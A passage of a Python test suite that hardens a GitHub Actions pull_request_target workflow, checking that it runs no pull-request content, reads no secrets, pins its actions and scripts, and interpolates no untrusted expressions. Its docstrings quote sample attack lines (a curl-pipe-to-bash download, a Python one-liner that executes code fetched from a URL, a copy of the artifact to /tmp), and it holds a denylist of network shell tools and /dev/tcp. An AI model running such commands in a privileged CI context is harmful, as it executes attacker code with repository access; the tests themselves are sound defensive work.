        on this file in a PR.

        It must be `github.event_name` and not `github.event.action`: the action
        differs across the four declared types, which would stop a push from
        collapsing a label's run.
        """
        block = strip_comments(job_block(self.text, "capture"))
        group = re.search(r"^\s+group:\s*(\S.*)$", block, re.M)
        self.assertIsNotNone(group, "the capture job has no concurrency group")
        # THE VALUE WITHOUT ITS TRAILING COMMENT. `strip_comments` drops only
        # whole-line comments, so moving the suffix into a comment on this very
        # line — `group: …-${{ github.event.pull_request.number }}  # -${{
        # github.event_name }}` — kept this green while the real group lost its
        # event separation. Measured.
        # THE WHOLE VALUE, not a required substring. Containment says what the
        # group must MENTION, and the group's job is decided by what it VARIES
        # over: `${{ github.run_id }}-${{ github.event_name }}` names the event
        # and still gives every run a group of its own, so nothing collapses
        # and the burst this key exists for costs a runner each. One literal,
        # edited deliberately.
        value = norm_expr(uncommented(group.group(1)))
        self.assertEqual(
            value,
            "hardened-pr-review-${{ github.repository }}"
            "-${{ github.event.pull_request.number }}-${{ github.event_name }}",
            f"the capture group is {value!r}. It must vary over the pull "
            "request and the event and nothing else: drop the event and a "
            "PR-ref `pull_request` copy of this workflow shares the group and "
            "silently cancels the real review; add the run and nothing "
            "collapses at all.",
        )


class TestStage1RunsNoPullRequestContent(unittest.TestCase):
    """`pull_request_target` is why this workflow needs no CI approval, and it
    is also why it would be the best foothold in the repository.

    THE TRADE. pytorch/pytorch makes a maintainer approve CI for contributors
    without write access. A review that starts on a label but then waits for a
    second click is not the product, so Stage 1 has to run unapproved — and
    `pull_request_target` is the trigger that does, because it runs from the
    DEFAULT BRANCH with the repository's secrets and a write-scoped token.

    THE OBLIGATION that buys. This file must execute nothing the pull request
    wrote. Not "nothing dangerous"; nothing. It is the one workflow in this
    design that holds a privileged context while a pull request is the subject,
    so the property has to be structural rather than reviewed each time.

    Each test below is one way the property could stop holding. They are
    deliberately about SHAPE, not about intent: the adversary modelled here is
    a maintainer adding a reasonable-looking step, which is how every published
    `pull_request_target` compromise has actually happened.

    NOT the only defence, and not load-bearing on its own. Stage 2 re-derives
    pr_number, head_sha, base_sha and is_fork from the REST API and
    authenticates the artifact against `github.event.workflow_run.head_sha`;
    the artifact is corroborated, never believed. This is the layer that keeps
    Stage 1 from being worth attacking in the first place.
    """

    def setUp(self):
        self.raw = STAGE1.read_text()
        self.text = strip_comments(self.raw)
        self.capture = job_block(self.text, "capture")

    # --- the trigger itself, and the two files agreeing about it -----------

    def test_the_trigger_is_pull_request_target(self):
        """`on: pull_request` would restore the approval click this exists to
        avoid; anything else would stop the pipeline outright."""
        on = self.text.split("jobs:", 1)[0]
        self.assertRegex(
            on,
            r"(?m)^on:\s*\n\s+pull_request_target:",
            "Stage 1's trigger is no longer `pull_request_target`; a fork PR's "
            "review will now wait on a maintainer approving CI.",
        )
        # And not BOTH. A `pull_request` trigger runs this file FROM THE PR'S
        # OWN REF, under the same workflow name, so one event fires two runs of
        # it: doubled cost, and a second Stage 2 that `prepare`'s event gate
        # refuses — a `skipped` run with no telemetry row, which reads exactly
        # like a PR nobody labelled.
        #
        # IT IS NO LONGER A CANCELLATION, and the earlier version of this
        # comment said it was. Stage 1 has no workflow-level group any more, and
        # the `capture` group is keyed by `github.event_name`, so the two runs
        # take different groups. That is the sibling test at
        # `test_the_capture_group_is_keyed_by_event`, not this one.
        self.assertIsNone(
            re.search(r"^\s+pull_request:", on, re.M),
            "Stage 1 declares a `pull_request` trigger as well. That run comes "
            "from the PR's own ref and shares this workflow's name, so every "
            "event fires two Stage 1 runs and the second Stage 2 is refused by "
            "its own event gate — a `skipped` run with no row.",
        )

    def test_stage2_accepts_runs_from_exactly_that_trigger(self):
        """The two files must agree, and disagreement is SILENT.

        Stage 2 gates on `workflow_run.event`. Change the trigger on one side
        only and every run fails that condition: no review, no telemetry row,
        and no failure anywhere — indistinguishable from a PR nobody labelled.
        """
        gate = job_if(job_block(STAGE2.read_text(), "prepare"))
        self.assertIn(
            "github.event.workflow_run.event == 'pull_request_target'",
            " ".join(gate.split()),
            "Stage 2 does not require the trigger Stage 1 uses; the pipeline "
            "would go quiet rather than fail.",
        )

    def test_the_event_condition_is_binding_and_not_merely_present(self):
        """Same contract as the workflow-path pin, and now the stronger of the
        two: a PR-authored workflow cannot produce a `pull_request_target`
        event at all, because since 2025-12-08 that trigger reads the file from
        the repository's DEFAULT BRANCH, whatever the PR's base branch is.
        Demote this behind a `||` and the lookalike path reopens.
        """
        expr = job_if(job_block(STAGE2.read_text(), "prepare"))
        tree = parse_bool_expr(expr)
        atoms = expr_atoms(tree)
        target = [
            a
            for a in atoms
            if re.fullmatch(
                r"github\.event\.workflow_run\.event\s*==\s*'pull_request_target'", a
            )
        ]
        self.assertEqual(len(target), 1, f"expected one event condition, got {target}")
        others = sorted(atoms - {target[0], "true", "false"})
        self.assertLessEqual(len(others), 12, f"too many conditions: {others}")
        for bits in itertools.product([False, True], repeat=len(others)):
            env = dict(zip(others, bits))
            env[target[0]] = False
            self.assertFalse(
                eval_expr(tree, env),
                f"prepare's gate admits a run NOT triggered by "
                f"pull_request_target, given {env}. A pull request can add a "
                f"`pull_request` workflow with this one's name, so that path "
                f"is reachable by anyone who can open a PR.",
            )

    # --- the SET of things that run, not just the shape of each one --------

    EXPECTED_JOBS = ("capture",)
    EXPECTED_STEPS = ("Capture PR coordinates", "Upload capture artifact")
    # Job-level keys that introduce execution WITHOUT adding a step. A
    # `services:` or `container:` image runs before step 1; `defaults.run`
    # rewrites every step's shell; a job-level `uses:` makes the whole job a
    # call to a workflow defined elsewhere. None would be caught by counting
    # steps, which is why they are named rather than assumed absent.
    FORBIDDEN_JOB_KEYS = ("container", "services", "defaults", "uses", "strategy")
    # The only keys a step here may carry. `shell:` is absent deliberately: it
    # selects the interpreter, and the executable tests below run the script
    # under bash, so a step that quietly became `shell: python3 {0}` would be
    # tested by something other than what runs it.
    ALLOWED_STEP_KEYS = frozenset(("name", "env", "run", "uses", "with"))
    # sha256[:16] of each step's DEDENTED `run:` body. Step NAMES do not pin
    # step CONTENT — a line added inside the existing capture script needs no
    # new step, no new job key, no workflow expression and no forbidden token,
    # and the set-pin above sees nothing. So the script itself is pinned.
    # Update these deliberately when you change the shell, which is the whole
    # point: in this file that has to be an act, not an edit.
    # Over the RAW body, comments included — see the test for why.
    EXPECTED_RUN_DIGESTS = {"Capture PR coordinates": "d37176225e66e4c4"}
    # The exact action each step may use. "Pinned to a SHA" is not enough on
    # its own: `actions/github-script` at a real pinned SHA, with a
    # `with.script: |` body, executes JavaScript that can read the PR payload
    # and run whatever it likes — no forbidden shell token, no `${{ }}`, no
    # change to any `run:` digest, and the step keeps its name. Which action
    # runs is as load-bearing as which script does.
    EXPECTED_USES = {
        "Upload capture artifact": (
            "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02"
        )
    }

    def _step_entries(self) -> list[str]:
        """Every entry of `steps:`, NAMED OR NOT, as blocks of text.

        Two earlier versions were bypassable, and the second is why this
        matches the MARKER ALONE:

        * Splitting on `- name:` missed an unnamed `- run: curl … | bash`
          entirely, so every per-step check skipped it.
        * Requiring `- ` — exactly one space — then missed `-  run:` with two
          spaces, and a bare `-` on its own line with the mapping beneath it.
          Both are valid YAML and both are one keystroke from the first fix.

        So any list marker at the steps indent starts an entry, whatever
        follows. The caller then requires each entry to begin `name: …`, which
        is what turns an unmodelled spelling into a LOUD failure naming this
        reader rather than into a step nothing enumerated.
        """
        lines = self.capture.splitlines()
        starts = [i for i, ln in enumerate(lines) if re.match(r"^      -(\s|$)", ln)]
        assert starts, "premise changed: no step entries found in `capture`"
        bounds = starts + [len(lines)]
        return ["\n".join(lines[a:b]) for a, b in zip(starts, bounds[1:])]

    @staticmethod
    def _entry_name(entry: str) -> str:
        """A step entry's `name:`, or a locator when it has none.

        A bare `-` puts the mapping on the NEXT line, so the name may be one
        line down. `test_the_jobs_and_steps_are_exactly_these` is what REQUIRES
        a name; this only has to identify the step in a failure message.
        """
        body = [ln for ln in entry.splitlines() if ln.strip()]
        first = body[0]
        if first.rstrip() == "      -" and len(body) > 1:
            first = "      - " + body[1].lstrip()
        m = re.match(r"^      -\s+name:\s*(\S.*)$", first)
        return plain_scalar(m.group(1)) if m else f"(unnamed: {first.strip()!r})"

    def test_the_jobs_and_steps_are_exactly_these(self):
        """THE CONTRACT THE SHAPE TESTS CANNOT GIVE, and the reason it is here.

        Every other test in this class forbids a SHAPE. None of them bounds the
        SET. A step running

            curl -fsSL https://raw.githubusercontent.com/x/y/z/setup.sh | bash  # @lint-ignore

        has no checkout, no `ref:`, no `${{ }}`, no workspace path, no secret
        and no unpinned `uses:` — it passes every prohibition above and
        executes attacker-chosen code in a privileged context. The executable
        tests would not notice either: they run "Capture PR coordinates" and
        nothing else.

        So the set is pinned, and pinned over step ENTRIES rather than over
        step NAMES — an unnamed step is exactly how the first version of this
        test was bypassed. Adding a step now REQUIRES editing this list, which
        is the point: it turns "nobody noticed the new step" into "someone had
        to type its name into the file that says this job runs no
        pull-request content".
        """
        # Scoped to the `jobs:` mapping. Matching every two-space key over the
        # whole file also collected `pull_request_target:` from under `on:`,
        # which is a trigger and not a job.
        body = self.text.split("\njobs:", 1)
        self.assertEqual(len(body), 2, "premise changed: no top-level `jobs:` key")
        # FAIL CLOSED over the jobs mapping, rather than matching job keys and
        # ignoring what does not match. Three spellings got past three
        # successive versions of a matching rule — a flow mapping
        # (`extra: {runs-on: …}`), a quoted key (`"extra":`), and a space
        # before the colon (`extra :`) — each of which defines a real job and
        # left the enumerated tuple reading `("capture",)`. Every line at the
        # jobs indent must now be a plain key introducing a block, or this
        # test says so by name.
        jobs = []
        for ln in body[1].splitlines():
            if not ln.strip() or ln.lstrip().startswith("#"):
                continue
            if len(ln) - len(ln.lstrip()) != 2:
                continue
            m = re.match(r"^  ([a-z_][a-z0-9_-]*):\s*$", ln.rstrip())
            self.assertIsNotNone(
                m,
                f"the line {ln.rstrip()!r} sits at the jobs indent but is not "
                "a plain `name:` introducing a block. It may be a perfectly "
                "good job — quoted, a flow mapping, or with a space before "
                "the colon — and this reader cannot count it, which is how a "
                "second job hides from the exact-set assertion below.",
            )
            jobs.append(m.group(1))
        jobs = tuple(jobs)
        self.assertEqual(
            jobs,
            self.EXPECTED_JOBS,
            f"Stage 1's jobs are {jobs}. Every job here runs in a privileged "
            "context with no CI approval; adding one is a deliberate act.",
        )

        entries = self._step_entries()
        names = []
        for entry in entries:
            # A bare `-` puts the mapping on the NEXT line, so the name may be
            # one line down. Both spellings are legal and both must land on
            # `name:` as the entry's first key.
            body = [ln for ln in entry.splitlines() if ln.strip()]
            first = body[0]
            if first.rstrip() == "      -" and len(body) > 1:
                first = "      - " + body[1].lstrip()
            m = re.match(r"^      -\s+name:\s*(\S.*)$", first)
            self.assertIsNotNone(
                m,
                f"a step in Stage 1 does not begin with `name:` ({first.strip()!r}). "
                "Unnamed steps are forbidden here because the checks in this "
                "class are keyed to the named set, and an unnamed one is the "
                "cheapest way to add an executable body nobody enumerated.",
            )
            names.append(plain_scalar(m.group(1)))
        self.assertEqual(
            tuple(names),
            self.EXPECTED_STEPS,
            f"Stage 1's steps are {tuple(names)}. If you added one, add it here "
            "too — and re-read this class's docstring first, because a step "
            "that fetches or executes anything breaks the property the trigger "
            "depends on.",
        )

    def test_the_job_declares_no_execution_outside_its_steps(self):
        """Counting steps does not bound a `services:` image or `defaults.run`.

        These start containers or rewrite every step's shell without appearing
        in the step list at all, so the set-pin above cannot see them.

        SCANNED OVER THE WHOLE JOB, and over the workflow level too. An
        earlier version read only the text BEFORE `steps:`, which quietly made
        the check depend on key ORDER — YAML does not, so `services:` written
        after the step list started the image and the test saw nothing. The
        workflow level matters for the same reason: a `defaults.run.shell`
        there changes the interpreter of the very step the executable tests
        run under an explicitly-chosen bash.
        """
        # THE WHOLE FILE at column 0, not the region before `jobs:`. YAML
        # does not constrain key order, so `defaults:` written AFTER the jobs
        # mapping is still a workflow-level key and the earlier split could
        # not see it. This is the same order assumption that had to be
        # removed from the job-level scan below.
        workflow_level = self.text
        for key in self.FORBIDDEN_JOB_KEYS:
            self.assertIsNone(
                re.search(rf"(?m)^[\"']?{key}[\"']?:", workflow_level),
                f"Stage 1 declares `{key}:` at workflow level, which reaches "
                "the capture job without appearing in it.",
            )
            self.assertIsNone(
                re.search(rf"(?m)^    {key}:", self.capture),
                f"the capture job declares `{key}:`. That introduces execution "
                "or configuration this class's step-level checks do not see; "
                "if it is genuinely needed, review it against the no-untrusted-"
                "content property first, then teach this test.",
            )

    def test_every_step_script_is_the_one_that_was_reviewed(self):
        """THE CONTROL THE SET-PIN CANNOT GIVE, and the one that closes it.

        Pinning step NAMES bounds how many things run. It says nothing about
        WHAT they run. One line inside the existing capture script —

            python3 -c 'import urllib.request;
                        exec(urllib.request.urlopen("https://x/p.py").read())'  # @lint-ignore

        — adds no step, no job key and no workflow expression, and matches no
        token in the denylist below. Every other check in this class passes.

        A denylist cannot fix that; there is always another spelling. So the
        script is pinned by DIGEST. Any edit to the shell of a workflow that
        runs in a privileged context without CI approval now has to be typed
        into this file as well, which is the reviewability property the whole
        class is claiming.

        If you are here after a legitimate change: read the diff, satisfy
        yourself it executes nothing the pull request wrote, then paste the
        digest the failure message prints.
        """
        # FROM THE RAW TEXT. Digesting the comment-stripped body means a
        # comment inserted INSIDE the script leaves the digest unmoved — and
        # a `#` line dropped between a command and its continuation changes
        # what bash runs, so the pin was not pinning the program. Measured: a
        # comment after `jq -n \` left all 21 structural checks green while
        # the real shell exited 127.
        raw_capture = job_block(self.raw, "capture").splitlines()
        starts = [
            i for i, ln in enumerate(raw_capture) if re.match(r"^      -(\s|$)", ln)
        ]
        self.assertTrue(starts, "premise changed: no step entries in raw `capture`")
        seen = {}
        for a, b in zip(starts, starts[1:] + [len(raw_capture)]):
            entry = "\n".join(raw_capture[a:b])
            runs = block_scalars(entry, "run")
            if not runs:
                continue
            name = self._entry_name(strip_comments(entry))
            self.assertEqual(
                len(runs), 1, f"step {name!r} has {len(runs)} `run:` blocks"
            )
            body = textwrap.dedent("\n".join(runs[0][1]))
            seen[name] = hashlib.sha256(body.encode()).hexdigest()[:16]
        self.assertEqual(
            seen,
            dict(self.EXPECTED_RUN_DIGESTS),
            "a Stage 1 step's shell changed. This job runs with the "
            "repository's context and no CI approval, so its script is pinned "
            "rather than merely shaped. Review the change, then update "
            "EXPECTED_RUN_DIGESTS with the values above.",
        )

    def test_no_expression_is_interpolated_into_a_stage1_script_even_in_a_comment(self):
        """ACTIONS INTERPOLATES BEFORE BASH PARSES, so a `#` is not a shield.

        Every other reader in this class works on `strip_comments(self.raw)`,
        which drops whole-line `#` comments — including comments inside a
        `run:` body. So `# PR context: ${{ github.event.pull_request.body }}`
        added to the capture script was invisible to the expression scan AND
        left the pinned digest unchanged, while the runner substituted a
        multi-line, attacker-authored body into the script text before bash saw
        a comment at all. A body containing a newline then contributes a line
        bash executes. Measured: all 328 tests green.

        Read from RAW, therefore, and refuse the construct outright — Stage 1
        passes everything it needs through `env:`, which is the rule the rest of
        this class already enforces for non-comment lines.
        """
        # From the RAW capture job, entry by entry. `block_scalars` matches only
        # at the OUTERMOST key indent of the text it is given, so handing it the
        # whole file finds nothing at all — which is how the first version of
        # this test compared [] with [] and passed on the mutation it exists to
        # catch.
        raw_capture = job_block(self.raw, "capture").splitlines()
        starts = [
            i for i, ln in enumerate(raw_capture) if re.match(r"^      -(\s|$)", ln)
        ]
        self.assertTrue(starts, "premise changed: no step entries in raw `capture`")
        bounds = starts + [len(raw_capture)]
        offenders = []
        for a, b in zip(starts, bounds[1:]):
            entry = "\n".join(raw_capture[a:b])
            for _, body in block_scalars(entry, "run"):
                offenders += [ln.strip() for ln in body if "${{" in ln]
        self.assertTrue(
            any(
                block_scalars("\n".join(raw_capture[a:b]), "run")
                for a, b in zip(starts, bounds[1:])
            ),
            "premise changed: no `run:` block scalar was found to scan",
        )
        self.assertEqual(
            offenders,
            [],
            f"a Stage 1 `run:` body interpolates an expression ({offenders}). "
            "The runner substitutes it before bash runs, and a `#` in front "
            "does not stop that — pass the value through `env:` instead.",
        )

    def test_every_step_uses_exactly_the_action_that_was_reviewed(self):
        """Which ACTION runs, not merely that it is pinned to some SHA.

        The sibling test establishes that no action is a local path or a
        mutable tag. It does not establish WHICH action, and swapping
        `actions/upload-artifact` for `actions/github-script` at an equally
        real SHA turns a `with:` input into an execution vector that no shell
        check here can see.
        """
        seen = {}
        for entry in self._step_entries():
            for ln in entry.splitlines():
                if m := _key_re("uses").match(ln.replace("- uses:", "uses:", 1)):
                    seen[self._entry_name(entry)] = uncommented(m.group(1))
        self.assertEqual(
            seen,
            dict(self.EXPECTED_USES),
            "a Stage 1 step's action changed. This job runs with the "
            "repository's context and no CI approval, so the action is pinned "
            "by identity as well as by SHA. Review what the new action can do "
            "with its inputs, then update EXPECTED_USES.",
        )

    def test_no_step_declares_a_key_outside_the_allowlist(self):
        """`shell:` is a step key, so `FORBIDDEN_JOB_KEYS` never sees it — and
        it changes the interpreter of a script the executable tests below run
        under bash. An allowlist rather than another denylist, because the
        interesting keys are the ones nobody has thought of yet."""
        for entry in self._step_entries():
            name = self._entry_name(entry)
            keys = {
                m.group(1)
                for ln in entry.splitlines()
                if (m := re.match(r"^\s+(?:- )?([A-Za-z_][\w-]*):", ln))
                and len(ln) - len(ln.lstrip()) <= 8
            }
            extra = sorted(keys - self.ALLOWED_STEP_KEYS)
            self.assertEqual(
                extra,
                [],
                f"step {name!r} declares {extra}, which this class does not "
                "model. If the key is genuinely needed, decide what it means "
                "for 'this job executes nothing the pull request wrote', then "
                "add it to ALLOWED_STEP_KEYS.",
            )

    # Every environment variable this workflow may set, at ANY scope. An
    # allowlist rather than a denylist because the dangerous ones are not the
    # ones with dangerous names: `BASH_ENV` makes non-interactive bash source
    # a file — or run a command substitution — BEFORE the pinned script, so it
    # executes arbitrary code while leaving every `run:` digest untouched.
    # `LD_PRELOAD`, `PYTHONSTARTUP`, `GIT_*_PAGER` and `ENV` are the same
    # shape. Six values, all GitHub-generated, plus the trusted label.
    ALLOWED_ENV_KEYS = frozenset(
        (
            "REVIEW_LABEL",
            "PR_NUM",
            "HEAD_SHA",
            "BASE_SHA",
            "BASE_REF",
            "IS_FORK",
            "TRIGGER_EVENT",
        )
    )

    def test_every_environment_key_is_on_the_allowlist(self):
        """Pinning the SCRIPT does not pin what bash runs before it.

        The digest covers the `run:` body. It does not cover the environment
        the shell starts in, and several standard variables turn that
        environment into an execution vector on their own.
        """
        # THE WHOLE FILE. Scanning "the prefix before `jobs:`" plus "the
        # capture job" left a third region uncovered: a top-level `env:`
        # written AFTER the jobs mapping is valid YAML, reaches the job, and
        # sat in neither. Whole-file GRAMMAR coverage does not make a narrower
        # semantic scan complete — they are separate properties.
        #
        # ACCEPTED OVER-REACH: this collects EVERY mapping named `env`, not
        # only the three that configure a runtime environment. A workflow
        # declaring `on.workflow_dispatch.inputs.env` would have its
        # `description:`/`type:` keys rejected as variable names. That is a
        # false positive on a legal edit, and it is the deliberate trade for
        # this file: two jobs' worth of YAML, one allowlist, and a failure
        # that says exactly what to do. Narrow it to the three real scopes if
        # this file ever grows an input named `env`.
        for block in indented_blocks(self.text, "env"):
            for ln in block:
                m = re.match(r"^\s*[\"']?([A-Za-z_][\w-]*)[\"']?\s*:", ln)
                if not m:
                    continue
                self.assertIn(
                    m.group(1),
                    self.ALLOWED_ENV_KEYS,
                    f"an `env:` mapping in Stage 1 sets {m.group(1)!r}, which "
                    "this class does not model. Some variable names make the "
                    "shell execute code before the pinned script runs "
                    "(BASH_ENV, ENV, LD_PRELOAD, PYTHONSTARTUP); decide which "
                    "this is, then add it to ALLOWED_ENV_KEYS.",
                )

    def test_stage1_uses_only_spellings_this_class_can_read(self):
        """FAIL CLOSED ON A GRAMMAR, instead of chasing spellings one at a time.

        Five review rounds each found another legal YAML spelling that a
        reader here did not model — `-  run:` with two spaces, a bare `-`
        marker, `"extra":` quoted, `extra :` with a space before the colon, a
        flow mapping, a key written after `jobs:`, an `&anchor` on an `env:`
        header. Each fix was correct and each left the next one open, because
        the language has more spellings than a text reader has rules and the
        bypass is always one keystroke from the last fix.

        So the direction is inverted: this asserts the file is written in the
        NARROW SUBSET the readers above are built for, and anything outside it
        is a loud failure naming this test rather than a silent mis-read. Same
        trade `TestTheReadersPremisesStillHold` makes for the Stage 2 readers.

        THE WHOLE FILE, not the capture job. Scoping it to the job left
        workflow-level configuration outside the subset, and that is where the
        two nastiest vectors live: `defaults : {run: {shell: 'bash -c "…"'}}`
        before `jobs:` changes the interpreter of a script whose digest never
        moves. A grammar that covers only part of a file is not a grammar.

        Reformatting the workflow stays legal; reformatting it into a spelling
        nothing here can parse does not.
        """
        refuse_unmodelled_spellings(self, self.text, "Stage 1")

    def test_no_step_reaches_the_network_or_evaluates_fetched_text(self):
        """Defence in depth behind the step-set pin, and it names the hazard.

        Scanned over the WHOLE job rather than per named step: a per-step loop
        keyed to `- name:` skipped an unnamed `- run:` entirely, which is the
        one case this most needs to catch.
        """
        forbidden = (
            "curl",
            "wget",
            "nc ",
            "pip install",
            "npm ",
            "npx ",
            "eval ",
            "source ",
            "bash <",
            "sh <",
            "| bash",
            "| sh",
            # bash opens a TCP/UDP socket on a redirect to these, with no
            # command word at all — so no PATH lookup, nothing for the sealed
            # run below to record, and none of the names above to match.
            "/dev/tcp",
            "/dev/udp",
        )
        for token in forbidden:
            self.assertNotIn(
                token,
                self.capture,
                f"Stage 1 contains {token!r}. This job runs with the "
                "repository's context and without CI approval; it must not "
                "fetch or evaluate anything.",
            )

    def test_the_capture_script_names_no_absolute_path(self):
        """The two holes the PATH seal cannot see, closed where they CAN be.

        Both were measured, not hypothesised.

        * `command_not_found_handle` fires only when bash performs a PATH
          search, and a command word containing a slash skips that search. So
          `/bin/cp pr-review-request.json /tmp/leaked.json || true` copies the
          artifact out while the sealed run reports `['jq']`, exit 0, and a
          one-file footprint.
        * A redirect needs no command at all: `echo x > /var/tmp/leak` is two
          builtins, so nothing is recorded, and the target is outside the
          sandbox root so the footprint inventory never sees it either. `/tmp`
          is the likely accident rather than the exotic one — Stage 2 writes
          `/tmp/pr-diff.txt`, so "the same thing, in Stage 1" is exactly the
          edit a maintainer would make.

        WHAT THIS IS: a text heuristic, and the honest framing matters because
        the first version of it was written as closure and was not. Enumerating
        "command positions" let five measured escapes through — `&>/tmp/x`,
        `$( /bin/cp … )`, `( exec /bin/cp … )`, `> "/tmp/x"`, and a `../`
        relative escape — and red a legal `case … in /*)`. So this does not try
        to know where a command is. It asserts the much simpler property the
        script actually has: NO path-shaped token anywhere, and no absolute or
        `..`-relative redirect target. EXPECTED_RUN_DIGESTS remains the fence;
        this exists so the fence is not the ONLY thing that notices.

        The residual false positive is deliberate and safe in direction: an
        absolute path inside a quoted message (`echo "see /tmp/x"`) reds. Nothing
        in the script needs one, and rephrasing costs a word.
        """
        script = self._capture_run()
        # Any path-shaped token: `/x`, `./x`, `../x`. The lookbehind keeps a `/`
        # inside a longer word out — notably the one in the character class
        # `[A-Za-z0-9._/-]` that validates BASE_REF.
        paths = re.findall(r"(?<![\w./-])(?:\./|/|\.\./)[\w./-]+", script)
        # Redirect targets, which have no command word to inspect at all:
        # `>`, `>>`, `&>`, `2>`, `13>`, `>|`, `>&`.
        targets = re.findall(
            r"(?:\d*>>?\||&?>>?|\d*>&?)\s*[\"']?((?:/|\.\./)\S+)", script
        )
        self.assertEqual(
            paths + targets,
            [],
            f"the capture step names path(s) {paths + targets}. A command word "
            "containing a slash skips the PATH lookup, and a redirect has no "
            "command word at all, so neither the sealed run nor the footprint "
            "inventory can see either one.",
        )

    # --- nothing from the pull request is fetched, resolved or read --------

    def test_nothing_is_checked_out(self):
        """No checkout means no PR tree, no submodules, no PR-supplied
        `.git/config`, and nothing on disk for a later step to source."""
        self.assertNotIn("actions/checkout", self.text)
        self.assertNotIn("git clone", self.text)
        self.assertNotIn("git fetch", self.text)

    def test_no_step_takes_a_ref_input(self):
        """`ref:` is how a checkout is aimed at the pull request. Under this
        trigger a checkout with no `ref:` takes the default branch, which is
        safe; naming a ref is
        how that stops being true, so the key may not appear at all."""
        offenders = [ln for ln in self.text.splitlines() if _key_re("ref").match(ln)]
        self.assertEqual(
            offenders,
            [],
            f"Stage 1 has a `ref:` input ({offenders}). Under "
            "pull_request_target that points a privileged job at code the pull "
            "request controls.",
        )

    def test_every_action_is_a_pinned_third_party_sha(self):
        """`uses: ./x` resolves from the WORKSPACE. There is no checkout today,
        so it would resolve to nothing — but it is the shape that turns lethal
        the moment one is added, and a tag or branch is mutable by its owner."""
        uses = [
            uncommented(m.group(1))
            for ln in self.text.splitlines()
            if (m := _key_re("uses").match(ln)) or (m := _key_re("- uses").match(ln))
        ]
        self.assertTrue(uses, "premise changed: Stage 1 uses no actions at all")
        for value in uses:
            self.assertRegex(
                value,
                r"^[A-Za-z0-9][\w.-]*/[\w.-]+(?:/[\w.-]+)*@[0-9a-f]{40}$",
                f"the action {value!r} is not a third-party repository pinned "
                "to a full commit SHA. A `./local` path resolves from the "
                "workspace and a tag can be moved by whoever owns it.",
            )

    def test_no_shell_interpolates_a_workflow_expression(self):
        """THE script-injection contract, and the reason the `env:` block exists.

        `${{ }}` is substituted into the script TEXT before bash sees it, so a
        value containing a quote or a `$(` becomes code. Passing values through
        `env:` and reading them as `"$VAR"` cannot do that, whatever they hold.
        Checked by executing the extracted shell as well — see below — because
        a trailing `#` satisfies a substring assertion and `strip_comments`
        only drops whole-line comments.
        """
        for step in self._step_entries():
            for _, body in block_scalars(step, "run"):
                script = "\n".join(body)
                self.assertNotIn(
                    "${{",
                    script,
                    "a Stage 1 `run:` interpolates a workflow expression "
                    "directly into the script; route it through `env:` and "
                    "quote it instead.",
                )

    def test_no_shell_reads_the_workspace(self):
        """Nothing is checked out there, so a read finds nothing today. It is
        forbidden anyway: paired with a checkout added later it is the whole
        attack, and the pairing is what nobody notices in review."""
        for step in self._step_entries():
            for _, body in block_scalars(step, "run"):
                script = "\n".join(body)
                for token in ("GITHUB_WORKSPACE", "github.workspace", "/pr/"):
                    self.assertNotIn(
                        token,
                        script,
                        f"a Stage 1 `run:` mentions {token!r}; this job must "
                        "not read anything the pull request could have put on "
                        "disk.",
                    )

    # --- the privileged context this trigger hands out is refused ----------

    def test_no_secret_is_referenced(self):
        """`pull_request_target` makes the full secret store readable here."""
        # ALL THREE SPELLINGS. `secrets['X']` is the index form of
        # `secrets.X`, and `github.token` is the same credential again — this
        # test is the one named for the property, so it must be the one that
        # enforces it rather than leaning on the expression allowlist to catch
        # the other two by accident.
        found = re.findall(
            r"secrets\s*[.\[]\S*|github\s*[.\[]\s*[\"']?token", self.text
        )
        self.assertEqual(
            found,
            [],
            f"Stage 1 reads a secret ({found}). Under this trigger that "
            "secret is available while a pull request is the subject, and "
            "Stage 1's output is a public artifact.",
        )

    def test_permissions_are_empty_at_both_levels(self):
        """The token this trigger mints carries write scopes by default.

        Workflow level so a job added later starts at zero, and job level so
        the one job that exists says so itself.
        """
        header = self.text.split("jobs:", 1)[0]
        self.assertRegex(
            header,
            r"(?m)^permissions:\s*\{\}\s*$",
            "Stage 1 has no workflow-level `permissions: {}`; a job added "
            "later would inherit a write-scoped token.",
        )
        self.assertRegex(
            self.capture,
            r"(?m)^\s{4}permissions:\s*\{\}\s*$",
            "the capture job no longer drops its permissions. It does no "
            "checkout and makes no API call, so it needs none.",
        )

    def test_every_interpolated_expression_is_one_of_these(self):
        """The enumeration, written out because "no untrusted input" is a
        claim about a SET and a set has to be listed to be checked.

        Everything here is GitHub-generated and either numeric, a SHA, a
        maintainer-controlled ref, or a boolean. None of it is text a
        contributor can write: not `title`, not `body`, not `head.ref`, not
        `user.login`. Adding one of those is the change this test exists to
        stop, and it is a plausible change — "log which PR we captured" is how
        it would be phrased.

        Scope, stated: this covers `${{ }}` interpolations. The job `if:` is
        a boolean gate whose result is a decision rather than a value. Earlier
        text here credited a class named TestTheLabelGateIsWhatSelectsAPr for
        pinning it; NO SUCH CLASS EXISTS in this file, and a citation of a
        fence nobody built is worse than no citation. What the gate actually
        has is `test_the_job_if_literals_match_the_declared_label`, which
        compares the two label literals in it against the declared env value —
        and nothing that establishes how those literals are WIRED. Stage 2's
        gate is parsed and evaluated as a formula by
        TestStage2CannotBeTriggeredByALookalikeWorkflow; Stage 1's is not.
        """
        allowed = {
            "github.repository": "owner/repo of the base repository",
            "github.event.pull_request.number": "integer",
            "github.event.pull_request.head.sha": "40-hex, GitHub-computed",
            "github.event.pull_request.base.sha": "40-hex, GitHub-computed",
            "github.event.pull_request.base.ref": "the BASE branch, which "
            "exists in this repository, so a maintainer named it",
            "github.event.pull_request.head.repo.full_name != github.repository": (
                "a comparison: the result is a boolean, never the repo name"
            ),
            "github.event.action": "one of the four declared trigger types",
            "github.event_name": "the trigger's own name, GitHub-set; reaches "
            "the capture job's concurrency group and nothing else — see "
            "test_the_capture_group_is_keyed_by_event",
        }
        found = {
            " ".join(e.split()) for e in re.findall(r"\$\{\{(.*?)\}\}", self.text, re.S)
        }
        # DEAD ENTRIES ARE STANDING PRE-AUTHORIZATION, not harmless text, and
        # that is not theoretical: deleting the workflow-level concurrency group
        # left four entries behind, and a reviewer used exactly that slack to
        # paste the deleted block back verbatim and keep this test green. So the
        # allowlist is checked in BOTH directions.
        stale = set(allowed) - found
        self.assertEqual(
            stale,
            set(),
            f"{sorted(stale)} is on the reviewed list but no longer appears in "
            "Stage 1. An entry nothing uses pre-authorises whatever brings it "
            "back — delete it with the expression it was written for.",
        )
        unexpected = found - set(allowed)
        self.assertEqual(
            unexpected,
            set(),
            f"Stage 1 interpolates {sorted(unexpected)}, which is not on the "
